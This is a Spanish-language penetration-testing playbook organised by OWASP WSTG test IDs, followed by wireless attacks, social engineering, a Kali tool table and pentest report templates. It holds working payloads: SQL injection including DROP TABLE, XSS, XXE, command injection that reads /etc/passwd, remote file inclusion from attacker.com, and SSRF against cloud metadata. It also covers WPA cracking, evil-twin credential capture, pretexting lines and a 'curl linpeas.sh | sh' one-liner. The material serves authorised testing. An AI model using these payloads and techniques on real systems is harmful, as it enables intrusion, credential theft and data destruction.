#### WSTG-CONF-04: Test for Old/Backup Files
```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x bak,old,tmp,backup,orig,copy,~,swp
```

#### WSTG-CONF-05: Test HTTP Methods
```bash
curl -X OPTIONS https://target.com -I
curl -X PUT https://target.com/test.txt -d "test"
curl -X DELETE https://target.com/test.txt
curl -X TRACE https://target.com -I  # Cross-Site Tracing
```

#### WSTG-CONF-06: HTTP Strict Transport Security
```bash
curl -I https://target.com | grep -i "strict-transport-security"
# Verificar presencia de HSTS header
# Verificar max-age, includeSubDomains, preload
```

#### WSTG-CONF-07: Cross-Origin Resource Sharing
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api
# Verificar Access-Control-Allow-Origin
# Verificar Access-Control-Allow-Credentials
```

#### WSTG-CONF-08: Test File Permission
```bash
# Verificar permisos de archivos sensibles
# /etc/passwd, /etc/shadow (en caso de LFI)
# Archivos de configuración de base de datos
```

#### WSTG-CONF-09: Test for Credentials Transport
```bash
# Verificar que las credenciales viajan por HTTPS
# testssl.sh para análisis SSL/TLS
testssl.sh https://target.com
```

#### WSTG-CONF-10: Test for Content Security Policy
```bash
curl -I https://target.com | grep -i "content-security-policy"
# Analizar directivas CSP
# Buscar 'unsafe-inline', 'unsafe-eval', wildcards
```

#### WSTG-ATHN-01: Test for Credentials Transported over Encrypted Channel
```bash
# Verificar que login usa HTTPS
# Verificar que cookies tienen flag Secure
# Verificar que no hay contenido mixto (HTTP en página HTTPS)
```

#### WSTG-ATHN-02: Test for Default Credentials
```bash
# Probar credenciales por defecto comunes
hydra -l admin -P /usr/share/wordlists/metasploit/default_passwords.txt target.com http-get /admin

# Credenciales comunes: admin/admin, admin/password, admin/123456, root/root
```

#### WSTG-ATHN-03: Test for Weak Lockout Mechanism
```bash
# Probar múltiples intentos de login sin bloqueo
# Verificar si hay CAPTCHA
# Verificar tiempo de bloqueo
```

#### WSTG-ATHN-04: Test for Bypassing Authentication Schema
```bash
# Manipulación de parámetros
# Modificación de tokens JWT
# SQL injection en login
# Cookie manipulation
# Path traversal para acceder a páginas protegidas
```

#### WSTG-ATHN-05: Test for Vulnerable Remember Password
```bash
# Analizar cookies de "recordarme"
# Verificar si las cookies contienen credenciales
# Verificar encriptación de cookies
```

#### WSTG-ATHN-06: Test for Browser Cache Weaknesses
```bash
# Verificar headers de cache en páginas sensibles
curl -I https://target.com/account | grep -i "cache-control\|pragma\|expires"
# Debería tener: Cache-Control: no-store, no-cache
```

#### WSTG-ATHN-07: Test for Weak Password Policy
```bash
# Probar políticas de contraseña
# Longitud mínima, complejidad, historial
```

#### WSTG-ATHZ-01: Test Directory Traversal
```bash
# Path traversal
curl https://target.com/page?file=../../../etc/passwd
curl https://target.com/page?file=....//....//....//etc/passwd
curl https://target.com/page?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### WSTG-ATHZ-02: Test for Bypassing Authorization
```bash
# IDOR (Insecure Direct Object Reference)
# Manipulación de IDs en URLs
# Privilege escalation horizontal/vertical
# Forced browsing a páginas de admin
```

#### WSTG-ATHZ-03: Test for Privilege Escalation
```bash
# Modificar rol en JWT
# Manipular parámetros de rol
# Acceder a funcionalidades de admin con usuario normal
```

#### WSTG-ATHZ-04: Test for Insecure Direct Object Reference
```bash
# Cambiar IDs de otros usuarios
# /api/user/123 → /api/user/124
# /invoice/1001 → /invoice/1002
```

#### WSTG-SESS-01: Test Session Management Schema
```bash
# Analizar cookies de sesión
# Verificar flags: Secure, HttpOnly, SameSite
# Verificar longitud y entropía del token
# Verificar si el token es predecible
```

#### WSTG-SESS-02: Test for Cookie Attributes
```bash
curl -c cookies.txt -b cookies.txt https://target.com/login
# Verificar: Secure, HttpOnly, SameSite, Domain, Path, Expires
```

#### WSTG-SESS-03: Test for Session Fixation
```bash
# Obtener sesión antes del login
# Verificar si la sesión cambia después del login
# Si no cambia → vulnerabilidad de fijación de sesión
```

#### WSTG-SESS-04: Test for Exposed Session Variables
```bash
# Verificar si el token de sesión viaja en URL
# Verificar si está en logs del servidor
```

#### WSTG-SESS-05: Test for Cross-Site Request Forgery
```bash
# Verificar presencia de tokens CSRF
# Verificar si los formulales tienen protección CSRF
# Verificar SameSite cookie attribute
```

#### WSTG-SESS-06: Test for Logout Functionality
```bash
# Verificar que la sesión se invalida en el servidor
# Verificar que las cookies se eliminan
# Verificar timeout de sesión
```

#### WSTG-SESS-07: Test for Session Timeout
```bash
# Verificar tiempo de expiración de sesión
# Debería ser: 15-30 min para aplicaciones sensibles
```

#### WSTG-SESS-08: Test for Session Puzzling
```bash
# Verificar si se pueden usar sesiones de diferentes aplicaciones
# Verificar si se puede reutilizar tokens
```

#### WSTG-INPVAL-01: Test for Reflected XSS
```bash
# Payloads básicos
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)

# Burp Suite → Intruder para automatizar
```

#### WSTG-INPVAL-02: Test for Stored XSS
```bash
# Inyectar en campos de perfil, comentarios, mensajes
# Verificar si el script se ejecuta para otros usuarios
```

#### WSTG-INPVAL-03: Test for HTTP Verb Tampering
```bash
# Probar diferentes métodos HTTP
curl -X POST https://target.com/page (cuando espera GET)
curl -X GET https://target.com/page (cuando espera POST)
```

#### WSTG-INPVAL-04: Test for HTTP Parameter Pollution
```bash
# Duplicar parámetros
?param=value1&param=value2
# Inyectar valores en parámetros existentes
```

#### WSTG-INPVAL-05: Test for SQL Injection
```bash
# Manual
' OR '1'='1
' OR 1=1--
1' UNION SELECT 1,2,3--
1; DROP TABLE users--
' AND 1=1--
' AND 1=2--

# SQLmap
sqlmap -u "https://target.com/page?id=1" --batch --risk=3 --level=5 --dbs
sqlmap -u "https://target.com/page?id=1" --forms --batch --crawl=3
```

#### WSTG-INPVAL-06: Test for LDAP Injection
```bash
# Payloads
*)(uid=*))(|(uid=*
admin)(&))
*))%00
```

#### WSTG-INPVAL-07: Test for ORM Injection
```bash
# Depende del ORM utilizado
# Hibernate, Entity Framework, ActiveRecord
```

#### WSTG-INPVAL-08: Test for XML Injection
```bash
# XXE (XML External Entity)
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>

# Billion Laughs (XML Bomb)
<?xml version="1.0"?>
<!DOCTYPE lolz [ <!ENTITY lol "lol"> <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> ]>
<data>&lol2;</data>
```

#### WSTG-INPVAL-09: Test for SSI Injection
```bash
<!--#exec cmd="ls" -->
<!--#include file="/etc/passwd" -->
<!--#echo var="DOCUMENT_NAME" -->
```

#### WSTG-INPVAL-10: Test for XPath Injection
```bash
' or '1'='1
' or ''='
//*/password
```

#### WSTG-INPVAL-11: Test for IMAP/SMTP Injection
```bash
# Inyectar comandos IMAP/SMTP en campos de email
```

#### WSTG-INPVAL-12: Test for Code Injection
```bash
; ls
| ls
$(ls)
`ls`
${7*7}
```

#### WSTG-INPVAL-13: Test for Command Injection
```bash
; cat /etc/passwd
| cat /etc/passwd
&& cat /etc/passwd
|| cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
```

#### WSTG-INPVAL-14: Test for Local File Inclusion
```bash
../../../etc/passwd
....//....//....//etc/passwd
/etc/passwd%00.php
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
```

#### WSTG-INPVAL-15: Test for Remote File Inclusion
```bash
http://attacker.com/shell.txt
\\attacker.com\share\shell.txt
```

#### WSTG-INPVAL-16: Test for HTTP Splitting
```bash
# CRLF injection
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>Injected</html>
```

#### WSTG-INPVAL-17: Test for HTTP Request Smuggling
```bash
# CL.TE, TE.CL, TE.TE smuggling
# Usar herramienta: smuggler (https://github.com/defparam/smuggler)
python3 smuggler.py -u https://target.com
```

#### WSTG-ERR-01: Test for Error Code Analysis
```bash
# Provocar errores y analizar información revelada
# Stack traces, rutas de archivos, versiones de software
```

#### WSTG-ERR-02: Test for Stack Traces
```bash
# Buscar stack traces en respuestas de error
# Revelan tecnología, rutas, versiones
```

#### WSTG-CRYP-01: Test for Weak SSL/TLS
```bash
testssl.sh https://target.com
sslyze --regular target.com
nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle -p 443 target.com
```

#### WSTG-CRYP-02: Test for Padding Oracle
```bash
# Verificar si la aplicación revela errores de padding
# PadBuster para automatizar
```

#### WSTG-CRYP-03: Test for Sensitive Data in Transit
```bash
# Verificar que datos sensibles viajan cifrados
# Verificar certificados SSL/TLS
```

#### WSTG-BUSLOGIC-01: Test Business Logic Data Validation
```bash
# Manipular precios en carrito de compras
# Modificar cantidades a valores negativos
# Manipular flujos de trabajo
```

#### WSTG-BUSLOGIC-02: Test Ability to Forge Requests
```bash
# Reenviar requests modificados
# Bypass de pasos en flujos de trabajo
```

#### WSTG-BUSLOGIC-03: Test Integrity Checks
```bash
# Verificar que no se pueden modificar datos sin validación
# Verificar checksums, hashes de integridad
```

#### WSTG-BUSLOGIC-04: Test for Process Timing
```bash
# Race conditions
# Time-of-check vs time-of-use
```

#### WSTG-BUSLOGIC-05: Test Number of Times a Function Can Be Used
```bash
# Verificar límites de uso
# Coupons, tokens, intentos
```

#### WSTG-BUSLOGIC-06: Test for Circumvention of Work Flows
```bash
# Saltarse pasos en procesos
# Acceder a estados no permitidos
```

#### WSTG-BUSLOGIC-07: Test Defenses Against Application Misuse
```bash
# Rate limiting
# Input validation
# WAF bypass
```

#### WSTG-BUSLOGIC-08: Test Upload of Unexpected File Types
```bash
# Subir archivos con extensiones no permitidas
# Subir archivos con doble extensión
# Subir archivos con MIME type manipulado
```

#### WSTG-BUSLOGIC-09: Test Upload of Malicious Files
```bash
# Web shells
# Archivos con malware (solo en entorno controlado)
# Archivos con EICAR test string
```

#### WSTG-CLD-01: Test Cloud Storage
```bash
# AWS S3 bucket enumeration
# Azure blob storage
# Google Cloud Storage
```

#### WSTG-CLD-02: Test for Server-Side Request Forgery
```bash
# SSRF básico
curl -X POST https://target.com/api/fetch -d "url=http://169.254.169.254/latest/meta-data/"
# AWS metadata, internal services
```

#### WSTG-CLD-03: Test for Header Injection
```bash
# Inyectar headers HTTP
# Host header injection
```

#### WSTG-CLD-04: Test for Insecure API Keys
```bash
# Buscar API keys en código fuente
# Buscar en JavaScript, repositorios Git
```

#### WSTG-CLD-05: Test for API Authorization
```bash
# Verificar autenticación de API endpoints
# Verificar autorización por rol
# BOLA/BFLA (Broken Object/Function Level Authorization)
```

#### WSTG-CLD-06: Test for API Input Validation
```bash
# Inyectar payloads en parámetros de API
# Probar diferentes content-types
```

#### WSTG-CLD-07: Test for API Rate Limiting
```bash
# Enviar múltiples requests simultáneos
# Verificar si hay rate limiting
```

#### WSTG-CLD-08: Test for WebSocket Security
```bash
# Analizar conexiones WebSocket
# Verificar autenticación
# Inyectar payloads
```

#### WSTG-CLD-09: Test for GraphQL Security
```bash
# Introspection queries
# Query depth attacks
# Batch query attacks
# Field-level authorization
```

#### WSTG-CLD-10: Test for SOAP Security
```bash
# XML injection
# WSDL enumeration
# SOAP action spoofing
```

---

## Wireless Pentesting

### Workflow de Wireless Pentesting

```
┌─────────────────────────────────────────────────────────────┐
│                 WIRELESS PENTEST WORKFLOW                     │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  1. RECONOCIMIENTO           → airodump-ng, Kismet, Wigle    │
│           │                                                   │
│  2. ENUMERACIÓN DE REDES     → airodump-ng --band abg        │
│           │                                                   │
│  3. ANÁLISIS DE SEGURIDAD    → WEP/WPA/WPA2/WPA3 detection   │
│           │                                                   │
│  4. CAPTURA DE HANDSHAKES    → airodump-ng + aireplay-ng     │
│           │                                                   │
│  5. CRACKING DE CONTRASEÑAS  → aircrack-ng, hashcat          │
│           │                                                   │
│  6. ATAQUES AVANZADOS        → Evil Twin, PMKID, KRACK       │
│           │                                                   │
│  7. POST-EXPLOITACIÓN        → Acceso a red interna          │
│           │                                                   │
│  8. DOCUMENTACIÓN            → Reporte con evidencias        │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

### Configuración del Adaptador

```bash
# Verificar adaptador wireless
iwconfig
airmon-ng

# Verificar que el adaptador soporta monitor mode
iw list | grep -A 5 "Supported interface modes"

# Activar modo monitor
sudo airmon-ng start wlan0
# Interface resultante: wlan0mon

# Verificar que no hay procesos conflictivos
sudo airmon-ng check kill

# Verificar modo monitor
iwconfig wlan0mon
```

### Reconocimiento Wireless

```bash
# Escaneo completo de redes
sudo airodump-ng wlan0mon

# Escaneo en banda específica
sudo airodump-ng --band a wlan0mon    # 5 GHz
sudo airodump-ng --band g wlan0mon    # 2.4 GHz
sudo airodump-ng --band abg wlan0mon  # Ambas bandas

# Escaneo con output a archivo
sudo airodump-ng -w scan_results --output-format csv,pcap wlan0mon

# Kismet (escaneo pasivo avanzado)
sudo kismet -c wlan0mon

# Wifite (escaneo automatizado)
sudo wifite --scan
```

### Ataque a Redes WEP

```bash
# Captura de IVs
sudo airodump-ng -c [channel] --bssid [BSSID] -w wep_capture wlan0mon

# Asociación falsa
sudo aireplay-ng -1 0 -a [BSSID] -h [MAC] wlan0mon

# Reinyección de ARP (método más efectivo)
sudo aireplay-ng -3 -b [BSSID] -h [MAC] wlan0mon

# Cracking
sudo aircrack-ng -b [BSSID] wep_capture-01.cap
```

### Ataque a Redes WPA/WPA2

```bash
# Captura de handshake
sudo airodump-ng -c [channel] --bssid [BSSID] -w wpa_capture wlan0mon

# Desautenticación para forzar handshake
sudo aireplay-ng -0 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon

# Verificar captura de handshake
sudo aircrack-ng wpa_capture-01.cap

# Cracking con aircrack-ng
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# Cracking con hashcat (más rápido con GPU)
# Convertir cap a hccapx
cap2hccapx wpa_capture-01.cap output.hccapx
# o usar hcxdumptool/hcxpcapngtool
hcxpcapngtool -o hash.hc22000 wpa_capture-01.cap

# Cracking con hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Ataque PMKID

```bash
# Captura PMKID sin necesidad de cliente conectado
sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid_capture.pcapng

# Convertir a formato hashcat
hcxpcapngtool -o pmkid_hash.16800 pmkid_capture.pcapng

# Cracking
hashcat -m 16800 pmkid_hash.16800 /usr/share/wordlists/rockyou.txt
```

### Evil Twin Attack

```bash
# Con Fluxion
sudo fluxion -i wlan0mon

# Manual con hostapd + dnsmasq
# 1. Configurar punto de acceso falso
sudo hostapd hostapd.conf

# 2. Configurar DHCP
sudo dnsmasq -C dnsmasq.conf

# 3. Capturar credenciales en portal cautivo
# (usar plantilla de portal cautivo similar al legítimo)
```

### WPA3 y Consideraciones

```bash
# WPA3-SAE: más resistente pero no inmune
# Dragonblood vulnerabilities (CVE-2019-9494, CVE-2019-9496)
# Requiere adaptador compatible con WPA3

# Verificar soporte WPA3
iw list | grep -i "SAE"
```

### MITRE ATT&CK — Wireless Pentesting Mapping

| Actividad | Táctica | Técnica ATT&CK |
|-----------|---------|----------------|
| Wireless Scanning | Reconnaissance | T1595, T1046 |
| Evil Twin | Initial Access | T1566, T1557 |
| Credential Capture | Credential Access | T1110, T1555 |
| Network Access | Initial Access | T1133 |
| Lateral Movement | Lateral Movement | T1021 |

---

## Ingeniería Social

### Workflow de Social Engineering

```
┌─────────────────────────────────────────────────────────────┐
│              SOCIAL ENGINEERING WORKFLOW                      │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  1. RECONOCIMIENTO           → OSINT, LinkedIn, redes        │
│           │                                                   │
│  2. DESARROLLO DE SCENARIO   → Pretexting, escenario         │
│           │                                                   │
│  3. PREPARACIÓN DE CAMPAÑA   → GoPhish, templates            │
│           │                                                   │
│  4. EJECUCIÓN                → Envío de campañas             │
│           │                                                   │
│  5. MONITOREO                → Tracking de métricas          │
│           │                                                   │
│  6. ANÁLISIS                 → Tasas de click, reporte       │
│           │                                                   │
│  7. CAPACITACIÓN             → Entrenamiento post-campaña    │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

### Phishing con GoPhish

```bash
# Instalar GoPhish
sudo apt install golang-go
git clone https://github.com/gophish/gophish.git
cd gophish && go build

# Iniciar GoPhish
sudo ./gophish
# Interfaz web: https://localhost:3333
# Default credentials: admin / gophish

# Configurar:
# 1. Sending Profile (SMTP del cliente o servidor de prueba)
# 2. Email Template (plantilla de phishing)
# 3. Landing Page (página de captura)
# 4. User Group (objetivos)
# 5. Campaign (campaña)
```

### Tipos de Campañas de Phishing

| Tipo | Descripción | Dificultad |
|------|-------------|------------|
| **Mass Phishing** | Genérico, sin personalización | Baja |
| **Spear Phishing** | Dirigido a personas específicas | Media |
| **Whaling** | Dirigido a ejecutivos (C-level) | Alta |
| **Vishing** | Phishing por teléfono | Media |
| **Smishing** | Phishing por SMS | Media |
| **USB Drop** | Dejar USBs maliciosos en instalaciones | Baja |

### Pretexting

Escenarios comunes para pretexting:
1. **Soporte técnico:** "Hola, soy de IT, necesito verificar su contraseña"
2. **Proveedor:** "Somos proveedores de [empresa], necesitamos acceso temporal"
3. **RRHH:** "Estamos actualizando registros, necesitamos confirmar datos"
4. **Auditoría:** "Somos auditores externos, necesitamos acceso a sistemas"
5. **Nuevo empleado:** "Soy el nuevo ingeniero de sistemas, necesito credenciales"

### Physical Security Testing

- **Tailgating:** Seguir a empleados por puertas de acceso controlado
- **Dumpster Diving:** Buscar documentos sensibles en basura
- **Shoulder Surfing:** Observar pantallas y teclados
- **Badge Cloning:** Clonar badges de acceso (si está en scope)
- **Lock Picking:** Probar seguridad de cerraduras físicas

### MITRE ATT&CK — Social Engineering Mapping

| Actividad | Táctica | Técnica ATT&CK |
|-----------|---------|----------------|
| Phishing | Initial Access | T1566.001 (Spearphishing Attachment), T1566.002 (Spearphishing Link), T1566.003 (Spearphishing via Service) |
| Pretexting | Reconnaissance | T1589, T1591, T1593 |
| Vishing | Initial Access | T1566 |
| Physical Access | Initial Access | T1566, T1078 |
| USB Drop | Initial Access | T1091, T1200 |

---

## Stack de Herramientas Kali

### Tabla Completa de Herramientas

| Categoría | Herramienta | Uso Principal | Comando Rápido |
|-----------|-------------|---------------|----------------|
| **Reconocimiento** | Nmap | Escaneo de red | `nmap -sV -sC -A target` |
| | Amass | Subdomain enumeration | `amass enum -d target.com` |
| | Subfinder | Subdomain discovery | `subfinder -d target.com` |
| | theHarvester | OSINT emails/dominios | `theHarvester -d target.com -b all` |
| | Shodan CLI | Búsqueda de dispositivos | `shodan search target` |
| | Recon-ng | Framework OSINT | `recon-ng` |
| | Maltego | Visual OSINT | `maltego` |
| **Vulnerability Scanning** | OpenVAS | Escaneo completo | Interfaz web |
| | Nikto | Web vulnerability scan | `nikto -h https://target` |
| | Nuclei | Template-based scanning | `nuclei -u https://target` |
| | WPScan | WordPress scanning | `wpscan --url https://target` |
| **Web Testing** | Burp Suite | Web proxy/testing | `burpsuite` |
| | OWASP ZAP | Web vulnerability scan | `zap` |
| | SQLmap | SQL injection | `sqlmap -u "url?id=1" --dbs` |
| | ffuf | Web fuzzing | `ffuf -u URL/FUZZ -w wordlist` |
| | Gobuster | Directory brute force | `gobuster dir -u URL -w wordlist` |
| | Feroxbuster | Recursive fuzzing | `feroxbuster -u URL` |
| | XSStrike | XSS detection | `python3 xsstrike.py -u URL` |
| **Password Attacks** | Hashcat | GPU password cracking | `hashcat -m [mode] hash wordlist` |
| | John the Ripper | CPU password cracking | `john --wordlist=wordlist hash` |
| | Hydra | Online brute force | `hydra -l user -P passlist service://target` |
| | Medusa | Parallel brute force | `medusa -h target -u user -P passlist -M ssh` |
| | CeWL | Custom wordlist generator | `cewl https://target -w wordlist.txt` |
| **Wireless** | Aircrack-ng | WiFi cracking suite | `airmon-ng start wlan0` |
| | Wifite | Automated wireless attack | `wifite` |
| | Kismet | Wireless network detection | `kismet` |
| | Fluxion | Evil Twin attack | `fluxion` |
| | hcxdumptool | PMKID capture | `hcxdumptool -i wlan0mon` |
| **Exploitation** | Metasploit | Exploitation framework | `msfconsole` |
| | Searchsploit | Exploit database search | `searchsploit keyword` |
| | BeEF | Browser exploitation | `beef-xss` |
| | SQLmap | SQL injection exploitation | `sqlmap -u URL --os-shell` |
| | Commando VM | Post-exploitation | Windows VM |
| **Post-Exploitation** | Mimikatz | Windows credential dumping | `mimikatz` |
| | BloodHound | AD attack paths | `bloodhound-python` |
| | Impacket | Network protocols | `impacket-psexec`, `secretsdump` |
| | CrackMapExec | AD/SMB enumeration | `crackmapexec smb target` |
| | LinPEAS | Linux privesc enumeration | `curl linpeas.sh \| sh` |
| | WinPEAS | Windows privesc enumeration | `winpeas.exe` |
| | Empire | Post-exploitation framework | `empire` |
| | Covenant | .NET C2 framework | `dotnet run` |
| **Social Engineering** | GoPhish | Phishing campaigns | `./gophish` |
| | SET | Social Engineer Toolkit | `setoolkit` |
| | King Phisher | Phishing campaign | `king-phisher` |
| **Reporting** | CherryTree | Note-taking/reporting | `cherrytree` |
| | Dradis | Reporting framework | `dradis` |
| | Obsidian | Knowledge management | `obsidian` |
| | Faraday | Vulnerability management | `faraday` |
| **Utilities** | Wireshark | Packet analysis | `wireshark` |
| | tshark | CLI packet analysis | `tshark -r capture.pcap` |
| | Burp Suite | Web proxy | `burpsuite` |
| | Proxychains | Proxy tunneling | `proxychains nmap ...` |
| | Chisel | TCP/UDP tunneling | `chisel server/client` |
| | Ligolo-ng | Pivoting tunnel | `ligolo-proxy` |

---

## Plantillas de Reporte

### Plantilla 1: Reporte Ejecutivo

```markdown
# REPORTE EJECUTIVO DE PENETRATION TESTING

## [Nombre del Cliente] — [Fecha]

---

### Clasificación: CONFIDENCIAL

**Preparado por:** BRIDA IT Services
**Fecha del reporte:** [DD/MM/AAAA]
**Período de testing:** [Fecha inicio] — [Fecha fin]
**Consultores:** [Nombres y roles]
**Versión del documento:** 1.0

---

### 1. Resumen Ejecutivo

[2-3 párrafos describiendo el propósito del pentest, el alcance general,
y los hallazgos más importantes en lenguaje de negocio.]

**Objetivo:** Evaluar la postura de seguridad de [cliente] mediante
pruebas de penetración controladas, identificando vulnerabilidades que
podrían ser explotadas por un atacante real.

**Alcance:** [Breve descripción del alcance: red externa, aplicaciones web,
red interna, wireless, ingeniería social]

**Metodología:** PTES (Penetration Testing Execution Standard), OWASP WSTG v4.2

---

### 2. Postura General de Seguridad

**Calificación General:** [CRÍTICA / ALTA / MEDIA / BAJA / BAJA]

| Categoría | Riesgo | Hallazgos |
|-----------|--------|-----------|
| Seguridad de Red | [Alto/Medio/Bajo] | [X] críticos, [X] altos |
| Aplicaciones Web | [Alto/Medio/Bajo] | [X] críticos, [X] altos |
| Seguridad Wireless | [Alto/Medio/Bajo] | [X] críticos, [X] altos |
| Factor Humano | [Alto/Medio/Bajo] | [X]% tasa de click phishing |
| Seguridad Física | [Alto/Medio/Bajo] | [X] hallazgos |

---

### 3. Distribución de Vulnerabilidades

```
Crítico:  [X]  ████████████████████
Alto:     [X]  ██████████████
Medio:    [X]  ██████████
Bajo:     [X]  ██████
Info:     [X]  ████
```

---

### 4. Top 5 Hallazgos Críticos

#### 4.1 [Nombre de la vulnerabilidad]
- **Severidad:** CRÍTICA
- **CVSS:** [X.X] ([Vector string])
- **Impacto:** [Descripción del impacto en el negocio]
- **Recomendación:** [Acción correctiva de alto nivel]

#### 4.2 [Nombre de la vulnerabilidad]
- **Severidad:** CRÍTICA
- **CVSS:** [X.X]
- **Impacto:** [Descripción]
- **Recomendación:** [Acción correctiva]

#### 4.3 [Nombre de la vulnerabilidad]
- **Severidad:** ALTA
- **CVSS:** [X.X]
- **Impacto:** [Descripción]
- **Recomendación:** [Acción correctiva]

#### 4.4 [Nombre de la vulnerabilidad]
- **Severidad:** ALTA
- **CVSS:** [X.X]
- **Impacto:** [Descripción]
- **Recomendación:** [Acción correctiva]

#### 4.5 [Nombre de la vulnerabilidad]
- **Severidad:** ALTA
- **CVSS:** [X.X]
- **Impacto:** [Descripción]
- **Recomendación:** [Acción correctiva]

---

### 5. Impacto Potencial en el Negocio

| Escenario de Ataque | Probabilidad | Impacto Financiero Estimado |
|---------------------|-------------|---------------------------|
| Comprometimiento de datos de clientes | [Alta/Media/Baja] | $[X] MXN |
| Interrupción de servicios críticos | [Alta/Media/Baja] | $[X] MXN |
| Comprometimiento de sistemas internos | [Alta/Media/Baja] | $[X] MXN |
| Ataque de ransomware | [Alta/Media/Baja] | $[X] MXN |
| Multas regulatorias (LFPDPPP) | [Alta/Media/Baja] | $[X] MXN |

---

### 6. Recomendaciones Estratégicas

1. **Corto plazo (0-30 días):**
   - [Remediación de vulnerabilidades críticas]
   - [Implementación de parches de seguridad]
   - [Cambio de credenciales comprometidas]

2. **Mediano plazo (30-90 días):**
   - [Implementación de controles de seguridad]
   - [Segmentación de red]
   - [Programa de capacitación en seguridad]

3. **Largo plazo (90+ días):**
   - [Programa continuo de pentesting]
   - [Implementación de SIEM/SOAR]
   - [Madurez en seguridad (NIST CSF)]

---

### 7. Cumplimiento Regulatorio

| Regulación | Estado | Observaciones |
|------------|--------|---------------|
| LFPDPPP | [Cumple/Parcial/No cumple] | [Observaciones] |
| NIST CSF | [Nivel de madurez] | [Observaciones] |
| ISO 27001 | [Aplicable/No aplica] | [Observaciones] |
| PCI-DSS | [Aplicable/No aplica] | [Observaciones] |

---

### 8. Conclusión

[Resumen de 2-3 párrafos sobre la postura de seguridad general,
las acciones más urgentes, y la recomendación de realizar
pruebas de seguimiento en X meses.]

---

**Preparado por:**
[Nombre], [Cargo] — BRIDA IT Services
[Email] | [Teléfono]

**Revisado por:**
[Nombre], [Cargo] — BRIDA IT Services

**Distribución autorizada:**
- [CEO/CIO del cliente]
- [CISO del cliente]
- [Director de IT del cliente]

**Este documento es CONFIDENCIAL y propiedad de [Cliente] y BRIDA IT Services.**
**Prohibida su distribución sin autorización escrita.**
```

### Plantilla 2: Reporte Técnico

```markdown
# REPORTE TÉCNICO DE PENETRATION TESTING

## [Nombre del Cliente] — [Fecha]

---

### Clasificación: CONFIDENCIAL

**Preparado por:** BRIDA IT Services
**Fecha del reporte:** [DD/MM/AAAA]
**Período de testing:** [Fecha inicio] — [Fecha fin]
**Consultores:** [Nombres, roles, certificaciones]
**Versión del documento:** 1.0

---

### 1. Información del Proyecto

| Campo | Detalle |
|-------|---------|
| Cliente | [Nombre] |
| Proyecto | [Código/Nombre] |
| Tipo de prueba | [External/Internal/Web/Wireless/Social Engineering] |
| Metodología | PTES, OWASP WSTG v4.2 |
| Herramientas principales | [Lista de herramientas utilizadas] |
| Alcance | [IPs, dominios, aplicaciones] |
| Ventana de testing | [Fechas y horarios] |

---

### 2. Metodología

#### 2.1 Fases Ejecutadas

1. **Pre-Engagement:** [Descripción de actividades]
2. **Intelligence Gathering:** [Descripción de actividades]
3. **Threat Modeling:** [Descripción de actividades]
4. **Vulnerability Analysis:** [Descripción de actividades]
5. **Exploitation:** [Descripción de actividades]
6. **Post-Exploitation:** [Descripción de actividades]
7. **Reporting:** [Descripción de actividades]

#### 2.2 Herramientas Utilizadas

| Herramienta | Versión | Propósito |
|-------------|---------|-----------|
| Kali Linux | [versión] | Sistema operativo |
| Nmap | [versión] | Escaneo de red |
| Metasploit | [versión] | Explotación |
| Burp Suite | [versión] | Testing web |
| [Otras] | [versión] | [Propósito] |

---

### 3. Hallazgos Detallados

---

#### HALLAZGO-001: [Nombre de la Vulnerabilidad]

| Campo | Detalle |
|-------|---------|
| **ID** | HALLAZGO-001 |
| **Título** | [Nombre descriptivo] |
| **Severidad** | [CRÍTICA / ALTA / MEDIA / BAJA / INFORMATIVA] |
| **CVSS v3.1** | [X.X] |
| **CVSS Vector** | [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H] |
| **CWE** | [CWE-XXX: Nombre] |
| **OWASP** | [OWASP Top 10 categoría] |
| **MITRE ATT&CK** | [TXXXX: Nombre de la técnica] |
| **NIST CSF** | [ID.XX-XX] |
| **D3FEND** | [D3-XXX] |
| **Activos afectados** | [IPs, URLs, sistemas] |

**Descripción:**
[Descripción técnica detallada de la vulnerabilidad, cómo fue descubierta,
y por qué es un riesgo.]

**Pasos de Reproducción:**
```bash
# Paso 1: [Descripción]
[Comando o acción]

# Paso 2: [Descripción]
[Comando o acción]

# Paso 3: [Descripción]
[Comando o acción]
```

**Evidencia:**
- [Screenshot 001: Descripción de la imagen]
- [Screenshot 002: Descripción de la imagen]
- [Log 001: Fragmento de log relevante]

**Impacto:**
[Descripción del impacto técnico y de negocio]

**Recomendación de Remediación:**
1. [Acción correctiva específica]
2. [Acción correctiva específica]
3. [Acción correctiva específica]

**Referencias:**
- [Enlace a CVE/CWE]
- [Enlace a documentación técnica]
- [Enlace a herramienta de remediación]

---

#### HALLAZGO-002: [Nombre de la Vulnerabilidad]

[Repetir estructura para cada hallazgo]

---

### 4. Cadenas de Ataque (Attack Paths)

#### Cadena de Ataque 1: [Nombre]

```
[Vector inicial] → [Movimiento 1] → [Movimiento 2] → [Objetivo]

Ejemplo:
Phishing email → Credential capture → VPN access → Internal network → 
Domain Admin → Full domain compromise
```

**Pasos detallados:**
1. [Paso 1 con evidencia]
2. [Paso 2 con evidencia]
3. [Paso 3 con evidencia]

**Impacto de la cadena:** [Descripción del impacto si un atacante completa esta cadena]

